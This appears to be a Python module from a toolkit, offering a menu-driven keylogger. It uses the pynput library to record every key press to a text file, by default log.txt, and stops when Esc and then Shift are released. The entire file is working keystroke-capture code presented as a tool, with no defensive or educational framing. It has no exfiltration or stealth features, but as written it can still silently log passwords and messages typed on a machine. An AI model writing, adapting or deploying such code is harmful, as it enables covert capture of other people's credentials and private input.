from pynput import keyboard
from apptools import screen

def keylogger_menu():
    menu = """
    1- Start Keylogger
    2- Name the save file
    3- Menu

    Note: If the file is not named, the file will be saved as log.txt

    """

    key = 1
    filename = "log.txt"
    while key == 1:
        m_input = int(input(menu))
        screen.clear()
        if m_input == 1: # Start keylogger
                escape = ['Key.esc' , 'Key.shift'] # Control list to cloasing the keylogger
                released_keys = []
                def on_press(key): # Taking inputs
                    try:
                        with open(filename, 'a') as f:
                            f.write('{0} pressed\n'.format(key)) # Write pressed key to log file

                    except:
                        pass

                def on_release(key):
                    released_keys.append(format(key)) # Adding released keys to the list
                    if released_keys[-2:] == escape: # Pressing esc and then shift will stops the keylogger
                        return False

                with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: # Pynput keyboard control
                    listener.join()

        if m_input == 2: # Name the file
            screen.clear()
            filename = input("Enter the name of the file: ") + ".txt"

        if m_input == 3: # Go back to menu
                key = 0
    else:
        screen.clear()
        return True